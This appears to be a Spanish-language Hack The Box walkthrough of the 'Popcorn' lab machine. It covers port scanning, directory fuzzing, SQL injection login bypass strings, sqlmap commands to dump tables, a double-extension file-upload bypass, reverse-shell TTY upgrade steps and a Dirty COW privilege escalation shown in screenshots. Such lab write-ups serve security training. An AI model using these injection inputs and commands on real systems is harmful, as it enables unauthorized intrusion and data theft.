# PopCorn

## NMAP
Revisar puertos y servicios en nmap.

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/6c6b3588-44e0-4a33-a576-d013e9709484)

Otro comando que se puede utilizar

```
nmap — script vuln 10.10.10.6
```

### traceroute

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/1aafa13c-8f3c-4419-8a43-082eda8973eb)


## Fuzzing (FFUF)

```
ffuf -fc 400  -t 4000 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.36.23/FUZZ
```

### WFUZZ

```
wfuzz -c --hc=404 -t 400 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://10.129.36.23/FUZZ 
```

### dirb

```
dirb http://10.129.36.23 -r -a popcorn.dirb
```

## Vulnerabilities y verciones en el software

### OpenSSH

La ultima version de este programa es: OpenSSH 9.3/9.3p1 (2023-03-15)

>  https://www.openssh.com/releasenotes.html


### APACHE

La ultima version de este programa es: 2.4.57 (released 2023-04-06)

> https://httpd.apache.org/download.cgi

## PHP

La ultima version de este programa es: 8.1.18 Released: 13 Apr 2023

## Ubuntu y el Kernel de Linux

Ubuntu esta en la version 23.04 y la version mas reciente del kernel de linux es la 6 y pico

> https://www.kernel.org/

## Enum

Podemos usar esta herramienta llamada nikto nos muestra vulnerabilidades que se podrian usar en un pentest en el reporte.

```
nikto -h popcorn.htb -o nikto.txt -p 80

```

## MySQL Database

Probamos la SQLI en el login:

```
admin'
Passwloquesea
```

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/3f02d9df-a837-4b7f-9d15-f7f02382a656)

Podriamos apsar el login con un comentario

```
admin'-- -
passwordloquesea

```

## SQLMAP

Vamos a practicar con esta herramienta para evitar estar respondiendo a las preguntas usa la opcion ***--batch***.

### Paso uno saber que DBS es y sacar las tablas.

```
sqlmap -r req.txt --batch --tables
sqlmap -u http://popcorn.htb/torrent/torrent/login.php --data="username=admin&password=masa" --method POST --dbs --batch
```
Sacar las tablas

```
sqlmap -u http://popcorn.htb/torrent/torrent/login.php --data="username=admin&password=masa" --method POST --tables 
```

Recuerda tienes que ir poniendo los datos que va sacando con mayusculas D (database) T(table)

## File Upload

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/0cebbff1-ff02-4e59-9b9f-cb25c49ae2d5)

Esta funcion de upload tiene 2 protecciones checa los magic numbers (la firma) y aparte la extencion del archivo osea toma lo que hay en el primer punto y ve que se auna extencion valida.

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/0e31d9dd-6d7e-44b1-9be9-207cfa15110b)

Lo vencemos poniendo doble extencion y dejando el PNG (la firma). Si le das clic en la imagen del torrent intenta cargarlo y te da la ruta

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/09a1a9cf-de89-418b-b465-8c53a989ed50)

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/ddb9f525-2886-4955-889b-c533a6da4499)

## RCE User

```
uname -a
```

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/cbb49234-60ef-486b-b26e-01865e39c9fd)

Linux es el tipo de sistema operativo,popcorn es el hostname, 2.6.31-14-generic-pae es la version del kernel, SMP Fri Oct 16 15:22:42 UTC 2009 es la fecha donde se compilo el codigo, i686 dice la arquitectura y lo que sigue es informacion del OS.


Para ver la distribucion usa

```
lsb_release -d
```

## Fully tty

```
script /dev/null -c bash
ctrl+Z
stty raw -echo
fg
[1]  + continued  nc -lvnp 1234 (output)
                                       reset
xterm
export TERM=xterm
export SHELL=bash
stty -a # Para ver el tamaño de las filas y columnas
stty rows 24 columns 80
```

## RCE Priv Esc Linux Kernel 2.6.22 < 3.9 - 'Dirty

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/2aee870d-8dd2-40d2-b505-38e0da65990d)

![image](https://github.com/gecr07/PopCorn-HTB/assets/63270579/e8857e00-feb0-43b4-bf81-dfa65a802e40)


